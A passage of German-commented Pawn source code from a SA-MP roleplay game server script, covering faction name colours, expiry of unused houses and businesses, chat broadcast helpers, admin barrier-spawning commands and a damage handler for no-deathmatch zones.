		  	SetPlayerColor(playerid,NAMECOLOR_LSCOP); // Copfarbe
  			}
  			else if(OnDuty[playerid]==0)
			{
		  	SetPlayerColor(playerid,TEAM_HIT_COLOR);
  			}
  		}
    	else if(PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pLeader] == 2)
  		{
  			if(OnDuty[playerid]==1)
			{
		  	SetPlayerColor(playerid,NAMECOLOR_FBI); // Copfarbe
  			}
  			else if(OnDuty[playerid]==0)
			{
		  	SetPlayerColor(playerid,TEAM_HIT_COLOR);
  			}
  		}
   		else if(PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3)
  		{
  			if(OnDuty[playerid]==1)
			{
		  	SetPlayerColor(playerid,NAMECOLOR_Bundeswehr); // Copfarbe
  			}
  			else if(OnDuty[playerid]==0)
			{
		  	SetPlayerColor(playerid,TEAM_HIT_COLOR);
  			}
  		}
  		else if(PlayerInfo[playerid][pMember] == 4 || PlayerInfo[playerid][pLeader] == 4)
  		{
  			if(JobDuty[playerid]==1)
			{
		  	SetPlayerColor(playerid,NAMECOLOR_MEDIC); // Copfarbe
  			}
  			else if(JobDuty[playerid]==0)
			{
		  	SetPlayerColor(playerid,TEAM_HIT_COLOR);
  			}
  		}
	    else if(PlayerInfo[playerid][pMember] == 5 || PlayerInfo[playerid][pLeader] == 5)
  		{
  			SetPlayerColor(playerid,TEAM_HIT_COLOR); // white SetPlayerColor(playerid,NAMECOLOR_LCN); // LaCostaNostrafarbe
  		}
	    else if(PlayerInfo[playerid][pMember] == 6 || PlayerInfo[playerid][pLeader] == 6)
  		{
  			SetPlayerColor(playerid,TEAM_HIT_COLOR); // white SetPlayerColor(playerid,NAMECOLOR_YAKUZA); // Yakuzafarbe
  		}
  		else if(PlayerInfo[playerid][pLeader] == 7)
  		{
  			SetPlayerColor(playerid,TEAM_HIT_COLOR); // white SetPlayerColor(playerid,NAMECOLOR_PRAESI); // Präsifarbe
  		}
  		else if(PlayerInfo[playerid][pMember] == 7)
  		{
  			SetPlayerColor(playerid,TEAM_HIT_COLOR); // white SetPlayerColor(playerid,NAMECOLOR_PRAESI_SCHUTZ); // Präsischutzfarbe
  		}
  		else if(PlayerInfo[playerid][pMember] == 8 || PlayerInfo[playerid][pLeader] == 8)
  		{
  			SetPlayerColor(playerid,TEAM_HIT_COLOR); // white SetPlayerColor(playerid,TEAM_HIT_COLOR); // white
  		}
	    else if(PlayerInfo[playerid][pMember] == 9 || PlayerInfo[playerid][pLeader] == 9)
  		{
  			SetPlayerColor(playerid,0xFF5A00FF); // white SetPlayerColor(playerid,NAMECOLOR_San News); // San Newsfarbe
  		}
  		else if(PlayerInfo[playerid][pMember] == 10 || PlayerInfo[playerid][pLeader] == 10)
  		{
  			SetPlayerColor(playerid,TEAM_HIT_COLOR); // white SetPlayerColor(playerid,NAMECOLOR_TAXI); // Taxifarbe
  		}
	    else if(PlayerInfo[playerid][pMember] == 11 || PlayerInfo[playerid][pLeader] == 11)
  		{
  			SetPlayerColor(playerid,TEAM_HIT_COLOR); // white SetPlayerColor(playerid,NAMECOLOR_LEHRER); // Fahrlehrerfarbe
  		}
  		else if(PlayerInfo[playerid][pMember] == 12 || PlayerInfo[playerid][pLeader] == 12)
  		{
  			SetPlayerColor(playerid,TEAM_HIT_COLOR); // white SetPlayerColor(playerid,TEAM_HIT_COLOR); // white
  		}
  		else if(PlayerInfo[playerid][pMember] == 13 || PlayerInfo[playerid][pLeader] == 13)
  		{
  			SetPlayerColor(playerid,TEAM_HIT_COLOR); // white SetPlayerColor(playerid,NAMECOLOR_Grove); // Grovefarbe
  		}
        else if(PlayerInfo[playerid][pMember] == 14 || PlayerInfo[playerid][pLeader] == 14)
  		{
  			SetPlayerColor(playerid,TEAM_HIT_COLOR); // white SetPlayerColor(playerid,NAMECOLOR_Ballas); // Ballasfarbe
  		}
  		else if(PlayerInfo[playerid][pMember] == 15 || PlayerInfo[playerid][pLeader] == 15)
  		{
  			SetPlayerColor(playerid,TEAM_HIT_COLOR); // white SetPlayerColor(playerid,NAMECOLOR_FAF); // Ls Biker Club-farbe
  		}
  		else if(PlayerInfo[playerid][pMember] == 16 || PlayerInfo[playerid][pLeader] == 16)
  		{
  			SetPlayerColor(playerid,TEAM_HIT_COLOR); // white SetPlayerColor(playerid,NAMECOLOR_Vagos); // Vagosfarbe
  		}
  		else if(PlayerInfo[playerid][pMember] == 17 || PlayerInfo[playerid][pLeader] == 17)
  		{
  			SetPlayerColor(playerid,TEAM_HIT_COLOR); // white SetPlayerColor(playerid,NAMECOLOR_Aztecas); //Aztecasfarbe
  		}
        else if(PlayerInfo[playerid][pMember] == 18 || PlayerInfo[playerid][pLeader] == 18)
  		{
  			SetPlayerColor(playerid,TEAM_HIT_COLOR); // white
  		}
  		else if(PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pLeader] == 20)
  		{
  			SetPlayerColor(playerid,TEAM_HIT_COLOR); // white
  		}
  		else if(PlayerInfo[playerid][pMember] == 22 || PlayerInfo[playerid][pLeader] == 22)
  		{
  			if(FWDuty[playerid]==1)
			{
		  	SetPlayerColor(playerid,NAMECOLOR_FBI); // Copfarbe
  			}
  			else if(FWDuty[playerid]==0)
			{
		  	SetPlayerColor(playerid,TEAM_HIT_COLOR);
  			}
  		}
  		else if(PlayerInfo[playerid][pMember] == 23 || PlayerInfo[playerid][pLeader] == 23)
  		{
  			SetPlayerColor(playerid,TEAM_HIT_COLOR); // white
  		}
  		else if(PlayerInfo[playerid][pMember] == 24 || PlayerInfo[playerid][pLeader] == 24)
  		{
  			if(JobDuty[playerid]==1)
			{
  			SetPlayerColor(playerid,0x33CCFFAA); // OAMT Farbe
  			}
  			else if(JobDuty[playerid]==0)
			{
		  	SetPlayerColor(playerid,TEAM_HIT_COLOR);
  			}
  		}
  		else
		{
	    	SetPlayerColor(playerid,TEAM_HIT_COLOR); // white
	    }
	}
}

Function IsAtDealership(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    if(IsPlayerInRangeOfPoint(playerid,35.0,-1706.2054,12.7528,3.5547))
		{
			return 1;
		}
	}
	return 0;
}

Function SyncTime()
{
	new tmphour;
	new tmpminute;
	new tmpsecond;
	gettime(tmphour, tmpminute, tmpsecond);
	FixHour(tmphour);
	tmphour = shifthour;
	if ((tmphour > ghour) || (tmphour == 0 && ghour == 23))
	{
		ghour = tmphour;
//		if (realtime)
//		{
//			SetWorldTime(tmphour);
//		}
	}
}


Function GetClosestPlayer(p1)
{
	new x,Float:dis,Float:dis2,player;
	player = -1;
	dis = 99999.99;
	for (x=0;x<MAX_PLAYERS;x++)
	{
		if(IsPlayerConnected(x))
		{
			if(x != p1)
			{
				dis2 = GetDistanceBetweenPlayers(x,p1);
				if(dis2 < dis && dis2 != -1.00)
				{
					dis = dis2;
					player = x;
				}
			}
		}
	}
	return player;
}

public DateProp(playerid)
{
//	Reload3DTexte();
    new curdate = getdate();
    new h = PlayerInfo[playerid][pHouseKey];
    {
        if(h != 999) {
	        if (strcmp(GetName(playerid), HouseInfo[h][hOwner], true) == 0)
	        {
	            HouseInfo[h][hDate] = curdate;
	            SaveProperty(h);
	        }
		}
    }
    new b = PlayerInfo[playerid][pPbiskey];
    {
        if(b != 255) {
            if(b >= 100) {
		        if (strcmp(GetName(playerid),SBizzInfo[b-100][sbOwner], true) == 0)
		        {
		            SBizzInfo[b-100][sbDate] = curdate;
		            OnPropUpdate_sb(b-100);
		        }
			} else {
			    if (strcmp(GetName(playerid), BizzInfo[b][bOwner], true) == 0)
		        {
		            BizzInfo[b][bDate] = curdate;
		            OnPropUpdate_b(b);
		        }
			}
		}
    }
    return 1;
}

public Checkprop()
{
    new olddate;
    new string[256], query[256];
    new curdate = getdate();
    for(new h = 0; h < sizeof(HouseInfo); h++) {
        if(HouseInfo[h][hOwned] == 1 && HouseInfo[h][hDate] > 9) {
            olddate = HouseInfo[h][hDate];
            if(curdate-olddate >= 15) {
                HouseInfo[h][hHel] = 0;
                HouseInfo[h][hArm] = 0;
//                HouseInfo[h][hHealthx] = 0;
//                HouseInfo[h][hHealthy] = 0;
//                HouseInfo[h][hHealthz] = 0;
//                HouseInfo[h][hArmourx] = 0;
//                HouseInfo[h][hArmoury] = 0;
//                HouseInfo[h][hArmourz] = 0;
                HouseInfo[h][hLock] = 1;
                HouseInfo[h][hOwned] = 0;
                format(query,sizeof(query),"UPDATE accounts SET `housekey`='999' WHERE name = '%s'",HouseInfo[h][hOwner]);
			//	mysql_function_query(mysqlcon,query, false, "", "");

				mysql_pquery(mysqlcon,query,"");


				//


				//mysql_query(query);
				//mysql_free_result();
                strmid(HouseInfo[h][hOwner], "Zu Verkaufen", 0, strlen("Zu Verkaufen"), 255);
                format(string, sizeof(string), "Haus ID:%i steht ab Sofort für %i$ wieder zum Verkauf!",h,HouseInfo[h][hValue]);
                SendClientMessageToAll(COLOR_LIGHTRED, string);
                SaveProperty(h);
            }
        }
    }
    for(new b = 0; b < sizeof(BizzInfo); b++) {
        if(BizzInfo[b][bOwned] == 1 && BizzInfo[b][bDate] > 9) {
            olddate = BizzInfo[b][bDate];
            if(curdate-olddate >= 15) {
                BizzInfo[b][bLocked] = 1;
                BizzInfo[b][bOwned] = 0;
                format(query,sizeof(query),"UPDATE accounts SET `bizzkey`='255' WHERE name = '%s'",BizzInfo[b][bOwner]);
			//	mysql_function_query(mysqlcon,query, false, "", "");
				mysql_pquery(mysqlcon,query,"");




				//mysql_query(query);
				//mysql_free_result();
                strmid(BizzInfo[b][bOwner], "Zu Verkaufen", 0, strlen("Zu Verkaufen"), 255);
                format(string, sizeof(string), "Bizz ID:%i steht ab Sofort für %i$ wieder zum Verkauf!",b,BizzInfo[b][bBuyPrice]);
                SendClientMessageToAll(COLOR_LIGHTRED, string);
                OnPropUpdate_b(b);
            }
        }
    }
    for(new s = 0; s < sizeof(SBizzInfo); s++) {
        if(SBizzInfo[s][sbOwned] == 1 && SBizzInfo[s][sbDate] > 9) {
            olddate = SBizzInfo[s][sbDate];
            if(curdate-olddate >= 15) {
                SBizzInfo[s][sbLocked] = 1;
                SBizzInfo[s][sbOwned] = 0;
                format(query,sizeof(query),"UPDATE accounts SET `bizzkey`='255' WHERE name = '%s'",SBizzInfo[s][sbOwner]);
			//	mysql_function_query(mysqlcon,query, false, "", "");

				mysql_pquery(mysqlcon,query,"");


				//mysql_query(query);
				//mysql_free_result();
                strmid(SBizzInfo[s][sbOwner], "Zu Verkaufen", 0, strlen("Zu Verkaufen"), 255);
                format(string, sizeof(string), "sBizz ID:%i steht ab Sofort für %i$ wieder zum Verkauf!",s,SBizzInfo[s][sbBuyPrice]);
                SendClientMessageToAll(COLOR_LIGHTRED, string);
                OnPropUpdate_sb(s);
            }
        }
    }

    return 1;
}
Function split2(const strsrc[], strdest[][], delimiter)
{
	new i, li;
	new aNum;
	new len;
	while(i <= strlen(strsrc)){
	    if(strsrc[i]==delimiter || i==strlen(strsrc)){
	        len = strmid(strdest[aNum], strsrc, li, i, 128);
	        strdest[aNum][len] = 0;
	        li = i+1;
	        aNum++;
		}
		i++;
	}
	return 1;
}

stock Log(filename[],write[])
{
	new File:LogFile, str[256], mhour, mminute, msecond, myear, mmonth, mday;
	if(fexist(filename))
	{
		LogFile = fopen(filename,io_append);
	}
	else
	{
		LogFile = fopen(filename,io_write);
	}
	gettime(mhour,mminute,msecond);
	getdate(myear,mmonth,mday);
	format(str,sizeof(str),"%02d.%02d.%d  %02d:%02d:%02d: %s\n",mday,mmonth,myear,mhour,mminute,msecond,write);
	fwrite(LogFile,str);
	fclose(LogFile);
}


stock ini_GetKey( line[] )
{
	new keyRes[256];
	keyRes[0] = 0;
    if ( strfind( line , "=" , true ) == -1 ) return keyRes;
    strmid( keyRes , line , 0 , strfind( line , "=" , true ) , sizeof( keyRes) );
    return keyRes;
}

stock ini_GetValue( line[] )
{
	new valRes[256];
	valRes[0]=0;
	if ( strfind( line , "=" , true ) == -1 ) return valRes;
	strmid( valRes , line , strfind( line , "=" , true )+1 , strlen( line ) , sizeof( valRes ) );
	return valRes;
}



Function BroadCast(color,const string[])
{
	SendClientMessageToAll(color, string);
	return 1;
}


Function SBroadCast(color,const string[],level)
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
			if (PlayerInfo[i][pSupporter] >= level)
			{
				SendClientMessage(i, color, string);
				printf("%s", string);
			}
		}
	}
	return 1;
}

Function ABroadCast(color,const string[],level)
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
			if (PlayerInfo[i][pAdmin] >= level)
			{
				SendClientMessage(i, color, string);
				printf("%s", string);
			}
		}
	}
	return 1;
}

Function OOCOff(color,const string[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
		    if(!gOoc[i])
		    {
				SendClientMessage(i, color, string);
			}
		}
	}
}

Function OOCNews(color,const string[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
		    if(!gNews[i])
		    {
				SendClientMessage(i, color, string);
			}
		}
	}
}

Function SendTeamMessage(team, color, string[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
		    if(gTeam[i] == team)
		    {
				SendClientMessage(i, color, string);
			}
		}
	}
}

Function SendRadioMessage(member, color, string[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
		    if(PlayerInfo[i][pMember] == member || PlayerInfo[i][pLeader] == member)
		    {
				SendClientMessage(i, color, string);
			}
		}
	}
}

public SendJobMessage(job, color, string[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
		    if(PlayerInfo[i][pJob] == job)
		    {
				SendClientMessage(i, color, string);
			}
		}
	}
}

Function SendNewFamilyMessage(family, color, string[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
		    if(PlayerInfo[i][pFMember] == family)
		    {
                if(!gFam[i])
                {
					SendClientMessage(i, color, string);
				}
			}
		}
	}
}

Function SendFamilyMessage(family, color, string[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
		    if(PlayerInfo[i][pMember] == family || PlayerInfo[i][pLeader] == family)
		    {
				SendClientMessage(i, color, string);
			}
		}
	}
}

Function SendIRCMessage(channel, color, string[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
		    if(PlayersChannel[i] == channel)
		    {
				SendClientMessage(i, color, string);
			}
		}
	}
}

Function SendTeamBeepMessage(team, color, string[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
		    if(gTeam[i] == team)
		    {
				SendClientMessage(i, color, string);
				RingTone[i] = 20;
			}
		}
	}
}

Function SendEnemyMessage(color, string[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
		    if(gTeam[i] >= 3)
		    {
				SendClientMessage(i, color, string);
			}
		}
	}
}

Function IsALeader(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    new leader = PlayerInfo[playerid][pLeader];
		if(leader==1 || leader==2 || leader==3 || leader==4 || leader==7 || leader==12 || leader==15 || leader==18 || leader==19)
		{
		    return 1;
		}
	}
	return 0;
}


Function SendAdminMessage(color, string[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
		    if(PlayerInfo[i][pAdmin] >= 1)
		    {
				SendClientMessage(i, color, string);
			}
		}
	}
}

Function SendLeaderMSG(leaderid, color, string[])
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
		    if(PlayerInfo[i][pLeader] == leaderid)
		    {
				SendClientMessage(i, color, string);
			}
		}
	}
}

Function PlayerPlayMusic(playerid)
{
	if(IsPlayerConnected(playerid))
	{
		SetTimer("StopMusic", 5000, 0);
		PlayerPlaySound(playerid, 1068, 0.0, 0.0, 0.0);
	}
}

Function StopMusic()
{
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
			PlayerPlaySound(i, 1069, 0.0, 0.0, 0.0);
		}
	}
}

dcmd_arb(playerid, params[]) // Erstellen des Objektes
{
    #pragma unused params
	if (PlayerInfo[playerid][pAdmin] <= 3) return SendClientMessage(playerid, COLOR_GREY, "Du bist kein Admin!");
	GetPlayerPos(playerid, pX, pY, pZ);
	GetPlayerFacingAngle(playerid, pR);
	if(sperrespawned[playerid]==MAX_Objekt)
	{
	    format(stringx, sizeof(stringx), "Du hast bereits %d Sperren erstellt!", MAX_Objekt);
	    SendClientMessage(playerid, COLOR_GREY, stringx);
	    return 1;
	}
	else
	{
		for(new i=0; i<MAX_Objekt; i++)
		{
		    if(Sperre[playerid][i] == 0)
		    {
		        if(Objekt[playerid] == 1) { Sperre[playerid][i] = CreateDynamicObject(1225, pX, pY, pZ, 0, 0, pR+180); SetPlayerPos(playerid, pX, pY+0.5, pZ); } // Explosives Fass
		        else if(Objekt[playerid] == 3) { Sperre[playerid][i] = CreateDynamicObject(981, pX, pY, pZ, 0, 0, pR+180); SetPlayerPos(playerid, pX, pY+2.5, pZ); } // Roadblock
		        else if(Objekt[playerid] == 4) { Sperre[playerid][i] = CreateDynamicObject(990, pX, pY, pZ, 0, 0, pR+180); SetPlayerPos(playerid, pX, pY+1, pZ); } // Zaun
		        else if(Objekt[playerid] == 5) { Sperre[playerid][i] = CreateDynamicObject(969, pX, pY, pZ-1.5, 0, 0, pR+180); SetPlayerPos(playerid, pX, pY+0.5, pZ); } // Tor
		        else if(Objekt[playerid] == 6) { Sperre[playerid][i] = CreateDynamicObject(993, pX, pY, pZ, 0, 0, pR+180); SetPlayerPos(playerid, pX, pY+1, pZ); } // Zaun
		        else if(Objekt[playerid] == 7) { Sperre[playerid][i] = CreateDynamicObject(978, pX, pY, pZ, 0, 0, pR+180); SetPlayerPos(playerid, pX, pY, pZ+0.5); } // Planke
		        else if(Objekt[playerid] == 8) { Sperre[playerid][i] = CreateDynamicObject(3279, pX-1.500, pY-1, pZ-1, 0, 0, pR+180); SetPlayerPos(playerid, pX, pY, pZ+18); } // Turm
		        else if(Objekt[playerid] == 9) { Sperre[playerid][i] = CreateDynamicObject(18780, pX, pY, pZ+10, 0, 0, pR+180); } // Rampe
		        else if(Objekt[playerid] == 10) { Sperre[playerid][i] = CreateDynamicObject(18778, pX, pY, pZ, 0, 0, pR+180); SetPlayerPos(playerid, pX, pY, pZ+2); } // Rampe (Breit)
		        else if(Objekt[playerid] == 11) { Sperre[playerid][i] = CreateDynamicObject(18779, pX, pY, pZ+8, 0, 0, pR+180); SetPlayerPos(playerid, pX, pY+5, pZ); } // Rampe (Steil)
		        else if(Objekt[playerid] == 12) { Sperre[playerid][i] = CreateDynamicObject(13607, pX, pY, pZ+5, 0, 0, pR+180); SetPlayerPos(playerid, pX, pY, pZ+5.5); } // Große Plattform
		        else if(Objekt[playerid] == 13) { Sperre[playerid][i] = CreateDynamicObject(18759, pX, pY, pZ-0.75, 0, 0, pR+180); SetPlayerPos(playerid, pX, pY, pZ); } // DM Cage 1
		        else if(Objekt[playerid] == 14) { Sperre[playerid][i] = CreateDynamicObject(19074, pX, pY, pZ+1.5, 0, 0, pR+180); SetPlayerPos(playerid, pX, pY, pZ); } // DM cage 2
		        else if(Objekt[playerid] == 15) { Sperre[playerid][i] = CreateDynamicObject(18843, pX, pY, pZ, 0, 0, pR+180); SetPlayerPos(playerid, pX, pY, pZ); } // Glas Kugel
		        else if(Objekt[playerid] == 999999) { Sperre[playerid][i] = CreateDynamicObject(ObjektID[playerid], pX, pY, pZ+1, 0, 0, pR+180); } // Objekt ID
 				else Sperre[playerid][i] = CreateDynamicObject(973, pX, pY, pZ, 0, 0, pR+180); // Leitplanke
				sperrespawned[playerid] ++;
				new name[MAX_PLAYER_NAME];
				GetPlayerName(playerid, name, sizeof(name));
				format(stringx, sizeof(stringx), "Admin Objekt %d erstellt von %s", i+1, name);
				SendClientMessage(playerid, COLOR_GREY, stringx);
				SperreLabel[playerid][i] = Create3DTextLabel(stringx, COLOR_WHITE, pX, pY, pZ, 20.0, 0, 1);
		        return 1;
		    }
		}
	}
	return 1;
}



dcmd_deletearb(playerid, params[]) // Eine eigene Sperre zerstören
{
    #pragma unused params
	if (PlayerInfo[playerid][pAdmin] <= 3) return SendClientMessage(playerid, COLOR_GREY, "Du bist kein Admin!");
	new DSperre;
	if(sscanf(params, "i", DSperre)) return SendClientMessage(playerid, COLOR_GREY, "/deletearb [Barriere]");
	if(Sperre[playerid][DSperre-1] == 0) return SendClientMessage(playerid, COLOR_GREY, "Sperre existiert nicht!");
	DestroyDynamicObject(Sperre[playerid][DSperre-1]);
	Delete3DTextLabel(SperreLabel[playerid][DSperre-1]);
	format(stringx, sizeof(stringx), "Barriere %d zerstört!", DSperre);
	SendClientMessage(playerid, COLOR_GREY, stringx);
	Sperre[playerid][DSperre-1] = 0;
	sperrespawned[playerid] --;
	return 1;
}

dcmd_deletearbfor(playerid, params[]) // Sperre eines anderen Spieler's zerstören
{
    #pragma unused params
	if (PlayerInfo[playerid][pAdmin] <= 3) return SendClientMessage(playerid, COLOR_GREY, "Du bist kein Admin!");
	new DSperre, pID, name[MAX_PLAYER_NAME], pname[MAX_PLAYER_NAME];
	if(sscanf(params, "ui",pID, DSperre)) return SendClientMessage(playerid, COLOR_GREY, "/deletearb [NAME/ID] [Barriere]");
	if(Sperre[pID][DSperre-1] == 0) return SendClientMessage(playerid, COLOR_GREY, "Sperre existiert nicht!");
	DestroyDynamicObject(Sperre[pID][DSperre-1]);
	Delete3DTextLabel(SperreLabel[pID][DSperre-1]);
	GetPlayerName(playerid, name, sizeof(name));
	GetPlayerName(pID, pname, sizeof(pname));
	format(stringx, sizeof(stringx), "Du hast Barriere %d von %s zerstört.", DSperre, pname);
	SendClientMessage(playerid, COLOR_GREY, stringx);
	format(stringx, sizeof(stringx), "Barriere %d wurde von %s zerstört!", DSperre, name);
	SendClientMessage(pID, COLOR_GREY, stringx);
	Sperre[pID][DSperre-1] = 0;
	sperrespawned[pID] --;
	return 1;
}
dcmd_arball(playerid, params[]) // Eigene Sperren zerstören
{
    #pragma unused params
	if (PlayerInfo[playerid][pAdmin] <= 3) return SendClientMessage(playerid, COLOR_GREY, "Du bist kein Admin!");
    for(new i=0; i<MAX_Objekt; i++)
	{
		DestroyDynamicObject(Sperre[playerid][i]);
		Sperre[playerid][i] = 0;
		Delete3DTextLabel(SperreLabel[playerid][i]);
		sperrespawned[playerid] = 0;
	}
	SendClientMessage(playerid, COLOR_GREY, "Du hast deine Sperren zerstört.");
	return 1;
}

dcmd_arbforall(playerid, params[]) // Bei diesem Command sind alle Sperren weg [ nicht nur eigene ]
{
    #pragma unused params
	if (PlayerInfo[playerid][pAdmin] <= 3) return SendClientMessage(playerid, COLOR_GREY, "Du bist kein Admin!");
	for(new user; user<MAX_PLAYERS; user++)
	{
	    for(new i=0; i<MAX_Objekt; i++)
		{
			DestroyDynamicObject(Sperre[user][i]);
			Sperre[user][i] = 0;
			Delete3DTextLabel(SperreLabel[user][i]);
			sperrespawned[i] = 0;
		}
	}
	new name[MAX_PLAYER_NAME];
	GetPlayerName(playerid, name, sizeof(name));
	format(stringx, sizeof(stringx), "Admin %s hat sämtliche Sperren zerstört.", name);
	ABroadCast(COLOR_RED, stringx, 2);
	return 1;
}

dcmd_arbobj(playerid, params[]) // Objekt auswahl
{
    #pragma unused params
	if (PlayerInfo[playerid][pAdmin] <= 3) return SendClientMessage(playerid, COLOR_GREY, "Du bist kein Admin!");
	ShowPlayerDialog(playerid, DIALOG_ARBOBJ, DIALOG_STYLE_LIST, "Admin Objekt", "1. Explosives Fass\n2. Leitplanke Grau\n3. Straßensperre\n4. Zaun 1(Geht kaputt)\n5. Tor\n6. Zaun 2(Geht kaputt)\n7. Leitplanke (Links)\n8. Turm\n9. Rampe\n10. Rampe(Breit)\n11. Rampe(Steil)\n12. Große Plattform\n13. DM Käfig 1\n14. DM Käfig 2\n15. Glas Kugel\n16. Objekt wählen", "Auswählen", "Abbrechen");
	return 1;
}
dcmd_arbobjid(playerid, params[])
{
	#pragma unused params
	if (PlayerInfo[playerid][pAdmin] <= 3) return SendClientMessage(playerid, COLOR_GREY, "Du bist kein Admin / nicht eingeloggt.");
	new objid;
	if(sscanf(params, "i", objid)) return SendClientMessage(playerid, COLOR_GREY, "Befehl: /arbobjid [Objekt ID]");
	Objekt[playerid] = 999999;
	ObjektID[playerid] = objid;
	format(stringx, sizeof(stringx), "Du hast nun Objekt %d zum spawnen.", objid);
	SendClientMessage(playerid, COLOR_GREY, stringx);
	return 1;
}
public OnPlayerTakeDamage(playerid, issuerid, Float: amount, weaponid, bodypart)
{
	if(issuerid != INVALID_PLAYER_ID && weaponid == 34 && bodypart == 9)
	{
		if(PlayerInfo[issuerid][pJailed] == 1 || PlayerInfo[issuerid][pJailed] == 2 || PlayerInfo[issuerid][pPrison] == 1)
		{
				TogglePlayerControllable(issuerid,0);
				SendClientMessage(issuerid, COLOR_RED, "Knast Deathmatch ist untersagt, Du wurdest 2 Minuten gefesselt");
				SetTimerEx("UnfreezePlayer",120000,0,"d",issuerid);
	    }
    }
	if(issuerid != INVALID_PLAYER_ID && weaponid == 34 && bodypart == 9)
	{
	    if(PlayerInfo[issuerid][sMember] == 3 || PlayerInfo[issuerid][sMember] == 22 || PlayerInfo[issuerid][sMember] == 20 || PlayerInfo[issuerid][sMember] == 1|| PlayerInfo[issuerid][sMember] == 2|| PlayerInfo[issuerid][sMember] == 8)
	    {
	        GameTextForPlayer(issuerid, "~g~Headshot", 5000, 4);
	        SetPlayerHealth(playerid, 0.0);
	    }
    }
    if(issuerid != INVALID_PLAYER_ID) // If not self-inflicted
    {
		if(AdminDuty[playerid] == 1)
		{
	        SetPlayerArmour(playerid, 100.0);
	        SetPlayerHealth(playerid, 100);
	    }
	}
    if(issuerid != INVALID_PLAYER_ID) // If not self-inflicted
    {
	    if(PlayerInfo[issuerid][pHitsound] == 1)
		{
		PlayerPlaySound(issuerid,17802,0.0,0.0,0.0);
		}
	}
    if(issuerid != INVALID_PLAYER_ID) // If not self-inflicted
    {
		if(IsPlayerInArea(playerid, 1436.625, -1764.764, 1611.556, -1618.698) ||
		IsPlayerInArea(playerid, 1691.416, -1677.914, 1759.867, -1583.168) ||
		IsPlayerInArea(playerid, 1159.018, -959.4252, 1292.118, -864.6794) ||
		IsPlayerInArea(playerid, 1181.835, -1417.363, 1269.301, -1283.14))
		{
        new
        infoString[512],
        victimName[MAX_PLAYER_NAME],
        attackerName[MAX_PLAYER_NAME];
        GetPlayerName(playerid, victimName, sizeof (victimName));
        GetPlayerName(issuerid, attackerName, sizeof (attackerName));
        format(infoString, sizeof(infoString), "*No-DM-Zone* Du wurdest von %s angegriffen (%.0f Schaden).", attackerName, amount);
        SendClientMessage(playerid, RED, infoString);
        }
        }
        if(issuerid != INVALID_PLAYER_ID) // If not self-inflicted
        {
		if(IsPlayerInArea(playerid, 1436.625, -1764.764, 1611.556, -1618.698) ||
		IsPlayerInArea(playerid, 1691.416, -1677.914, 1759.867, -1583.168) ||
		IsPlayerInArea(playerid, 1159.018, -959.4252, 1292.118, -864.6794) ||
		IsPlayerInArea(playerid, 1181.835, -1417.363, 1269.301, -1283.14) ||
		GetPlayerInterior(playerid) == 10)
		{
        new
        infoString[512],
        victimName[MAX_PLAYER_NAME],
        attackerName[MAX_PLAYER_NAME];
        GetPlayerName(playerid, victimName, sizeof (victimName));
        GetPlayerName(issuerid, attackerName, sizeof (attackerName));
        format(infoString, sizeof(infoString), "*No-DM-Zone* Du hast %s angegriffen (%.0f Schaden).", victimName, amount);
        SendClientMessage(issuerid, RED, infoString);
        }
    }
    return 1;
}
//---------------------------<[ OnPlayerCommandText ]>-------------------------------------------------------- <mark>
public OnPlayerCommandText(playerid, cmdtext[])
{
//	dcmd(farbe,5,cmdtext);
//	dcmd(kennzeichen,11,cmdtext);



/*
    if(strcmp(cmd, "/kick", true) == 0)
	{
		SendClientMessage(playerid, COLOR_NEWS, "1 ");
	    if(IsPlayerConnected(playerid))
	    {
			SendClientMessage(playerid, COLOR_NEWS, "2 ");
	    	tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /kick [playerid] [Grund]");
				return 1;
			}
			giveplayerid = ReturnUser(tmp);
		 	SendClientMessage(playerid, COLOR_NEWS, " 3");
			if (PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pSupporter] >= 1)
			{
		SendClientMessage(playerid, COLOR_NEWS, "4 ");
				if(IsPlayerConnected(giveplayerid))
				{
		SendClientMessage(playerid, COLOR_NEWS, " 5");
				    if(giveplayerid != INVALID_PLAYER_ID)
				    {
		SendClientMessage(playerid, COLOR_NEWS, " 6");
					    GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						new length = strlen(cmdtext);
						while ((idx < length) && (cmdtext[idx] <= ' '))
						{
							idx++;
						}
						new offset = idx;
						new result[64];
						while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
						{
							result[idx - offset] = cmdtext[idx];
							idx++;
						}
						result[idx - offset] = EOS;
						if(!strlen(result))
						{
							SendClientMessage(playerid, COLOR_GRAD2, "FEHLER: /kick [playerid] [Grund]");
							return 1;
						}
